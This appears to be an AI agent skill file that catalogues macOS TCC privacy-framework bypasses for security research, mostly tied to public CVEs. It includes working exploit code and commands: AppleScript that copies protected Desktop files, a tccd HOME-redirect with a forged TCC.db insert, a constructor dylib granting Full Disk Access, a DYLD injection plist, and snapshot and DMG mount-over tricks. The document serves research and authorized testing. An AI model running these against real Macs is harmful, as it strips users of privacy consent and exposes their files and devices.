---
name: macos-tcc-bypass-research
description: macOS TCC (Transparency, Consent, and Control) bypass research and analysis. Use this skill when investigating macOS security mechanisms, performing authorized penetration testing, analyzing TCC vulnerabilities, or researching macOS privilege escalation techniques. Trigger this skill for any macOS security research involving TCC database manipulation, process injection attacks, or bypassing macOS privacy protections.
---

# macOS TCC Bypass Research

A comprehensive guide to macOS Transparency, Consent, and Control (TCC) bypass techniques for security research and authorized penetration testing.

## Overview

TCC is macOS's privacy framework that controls application access to sensitive resources (camera, microphone, files, etc.). This skill covers known bypass techniques organized by attack vector.

## TCC Database Location

```
$HOME/Library/Application Support/com.apple.TCC/TCC.db
```

## Bypass Categories

### 1. Write Bypass (Not Actually a Bypass)

TCC doesn't protect from writing - only reading. If Terminal can't read Desktop, it can still write to it:

```bash
ls Desktop  # Operation not permitted
echo asd > Desktop/lalala  # Works
cat Desktop/lalala  # Works (extended attribute com.apple.macl added)
```

### 2. TCC ClickJacking

Overlay windows over TCC prompts to trick users into granting permissions.

**Reference**: [TCC-ClickJacking](https://github.com/breakpointHQ/TCC-ClickJacking)

### 3. TCC Request by Arbitrary Name

Create apps with legitimate names (Finder, Chrome) in `Info.plist` to request TCC access. Users believe the legitimate app is requesting access.

**Advanced**: Remove legit app from Dock, replace with fake one using same icon.

### 4. SSH Bypass

SSH historically had Full Disk Access by default. To disable:
- List SSH in TCC but disable it (removing doesn't remove privileges)
- Modern macOS requires Full Disk Access to enable SSH

**Reference**: [XCSSET Malware TCC Bypass](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

### 5. Handle Extensions - CVE-2022-26767

The `com.apple.macl` attribute grants apps read permissions when files are opened via drag&drop or double-click.

**Attack**: Register malicious app to handle all extensions, use Launch Services to open files.

### 6. iCloud Access

Entitlement `com.apple.private.icloud-account-access` allows communication with `com.apple.iCloudHelper` XPC service for iCloud tokens.

**Affected Apps**: iMovie, GarageBand

**Reference**: [OBTS v5.0 Talk](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### 7. kTCCServiceAppleEvents / Automation

Apps with Automation permission can control other apps and abuse their permissions.

#### Over iTerm

```applescript
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Over Finder

```applescript
set a_user to do shell script "logname"
tell application "Finder"
    set desc to path to home folder
    set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
    set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## CVE-Based Bypasses

### CVE-2020-9934 - TCC Daemon HOME Variable

The `tccd` daemon uses `$HOME` to access TCC database. Control `$HOME` via `launchctl` to redirect to controlled directory.

```bash
# Reset database
tccutil reset All

# Create fake TCC directory
mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"

# Set launchd HOME variable
launchctl setenv HOME /tmp/tccbypass

# Restart TCC daemon
launchctl stop com.apple.tccd && launchctl start com.apple.tccd

# Modify TCC database
sqlite3 TCC.db .dump
sqlite3 TCC.db "INSERT INTO access VALUES('kTCCServiceSystemPolicyDocumentsFolder', 'com.apple.Terminal', 0, 1, 1, X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003', NULL, NULL, 'UNUSED', NULL, NULL, 1333333333333337);"

# Access without prompt
ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes has TCC access but creates notes in non-protected locations. Copy protected files into notes to access them.

### CVE-2021-30782 - Translocation

`/usr/libexec/lsd` with `libsecurity_translocate` had `com.apple.private.nullfs_allow` and `kTCCServiceSystemPolicyAllFiles`.

**Attack**: Add quarantine attribute to "Library", call `com.apple.security.translocation` XPC service to map Library to `$TMPDIR/AppTranslocation/d/d/Library`.

### CVE-2023-38571 - Music & TV Race Condition

Music imports files from `~/Music/Music/Media.localized/Automatically Add to Music.localized/` using `rename(a, b)` which is vulnerable to race conditions.

**Attack**: Place fake TCC.db in the folder, race the rename operation.

### CVE-2023-32422 - SQLITE_SQLLOG_DIR

Setting `SQLITE_SQLLOG_DIR="path/folder"` causes any open database to be copied to that path.

**Attack**: Use symlink in filename to overwrite TCC.db when opened by FDA process.

**Reference**: [SQLol Writeup](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html)

### CVE-2023-32407 - MTL_DUMP_PIPELINES_TO_JSON_FILE

Metal framework environment variable triggers race condition in `rename(old, new)`.

```bash
# Set environment variable
MTL_DUMP_PIPELINES_TO_JSON_FILE="/Users/hacker/tmp/TCC.db"

# Create symlink
ln -s "/Users/hacker/Library/Application Support/com.apple.TCC/" /Users/hacker/ourlink

# Trigger with Music app
launchctl setenv MTL_DUMP_PIPELINES_TO_JSON_FILE /Users/hacker/tmp/TCC.db
```

**Reference**: [Lateralus Writeup](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` had `kTCCServiceSystemPolicySysAdminFiles` entitlement, loaded `.daplug` plugins without hardened runtime.

**Attack**: Change `NFSHomeDirectory` to take over user's TCC database.

**Reference**: [Original Report](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)

### CVE-2020-29621 - Coreaudiod

`/usr/sbin/coreaudiod` had `com.apple.security.cs.disable-library-validation` and `com.apple.private.tcc.manager`.

**Attack**: Load plugin from `/Library/Audio/Plug-Ins/HAL`.

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");
    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);
    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {
    add_tcc_entry();
    NSLog(@"[+] Exploitation finished...");
    exit(0);
}
```

**Reference**: [Original Report](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)

### CVE-2023-26818 - Telegram

Telegram had `com.apple.security.cs.allow-dyld-environment-variables` and `com.apple.security.cs.disable-library-validation`.

**Attack**: Use launchctl with custom plist to inject library.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.telegram.launcher</string>
    <key>RunAtLoad</key>
    <true/>
    <key>EnvironmentVariables</key>
    <dict>
        <key>DYLD_INSERT_LIBRARIES</key>
        <string>/tmp/telegram.dylib</string>
    </dict>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
    </array>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

**Reference**: [CVE-2023-26818 Writeup](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)

## Process Injection Techniques

### Device Abstraction Layer (DAL) Plug-Ins

Apps with `kTCCServiceCamera` load plugins from `/Library/CoreMediaIO/Plug-Ins/DAL` (not SIP restricted).

**Attack**: Store library with constructor in this location.

### Firefox

Firefox had `com.apple.security.cs.disable-library-validation` and `com.apple.security.cs.allow-dyld-environment-variables`.

**Reference**: [How to Rob a Firefox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)

### CVE-2020-10006

`/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` had `com.apple.private.tcc.allow` and `com.apple.security.get-task-allow`.

## Mount-Based Bypasses

### CVE-2020-9771 - mount_apfs

Any user can create and mount Time Machine snapshots with Full Disk Access.

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /

# Mount snapshot
mkdir /tmp/snap
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access files
ls /tmp/snap/Users/admin_user
```

**Reference**: [CVE-2020-9771 Writeup](https://theevilbit.github.io/posts/cve_2020_9771/)

### CVE-2021-1784 & CVE-2021-30808 - Mount Over TCC

Mount DMG over TCC directory to replace database.

```bash
# Mount over TCC directory
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

**Reference**: [CVE-2021-30808 Writeup](https://theevilbit.github.io/posts/cve-2021-30808/)

### CVE-2024-40855 - diskarbitrationd

Abused `diskarbitrationd` to bypass security checks in `DADiskMountWithArgumentsCommon`.

**Attack**: Direct call to `diskarbitrationd` allows `../` in paths and symlinks.

**Reference**: [Kandji Blog](https://www.kandji.io/blog/macos-audit-story-part2)

### asr

`/usr/sbin/asr` can copy and mount entire disk, bypassing TCC.

### Location Services

Location TCC database at `/var/db/locationd/clients.plist` wasn't protected from DMG mounting.

## Terminal Scripts

`.terminal` scripts can be invoked with Full Disk Access:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

```objectivec
NSTask *task = [[NSTask alloc] init];
NSString *exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app", exploit_location];
[task launch];
```

## NFSHomeDirectory Bypass

TCC uses `$HOME` from `NFSHomeDirectory` attribute. If you can modify this (requires `kTCCServiceSystemPolicySysAdminFiles`), you can weaponize it.

### CVE-2021-30970 - Powerdir

**Method 1**: Use `dsexport`/`dsimport` to modify user's HOME folder.

**Method 2**: Use `/usr/libexec/configd` with `com.apple.private.tcc.allow` and `kTCCServiceSystemPolicySysAdminFiles`.

**Reference**: [Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)

## Apple Remote Desktop

As root, enable ARD service - ARD agent gets Full Disk Access, can be abused to copy new TCC database.

## References

- [CVE-2020-9934 Bypass](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [SentinelOne TCC Bypass Lab](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [20+ Ways to Bypass macOS Privacy](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [Knockout Win Against TCC](https://www.youtube.com/watch?v=a9hsxPdRxsY)

## Usage Guidelines

1. **Authorization Required**: Only use these techniques on systems you own or have explicit written authorization to test.
2. **Documentation**: Document all findings and remediation recommendations.
3. **Testing Environment**: Prefer isolated test environments over production systems.
4. **Legal Compliance**: Ensure compliance with applicable laws and regulations.
5. **Disclosure**: Follow responsible disclosure practices for vulnerabilities found.
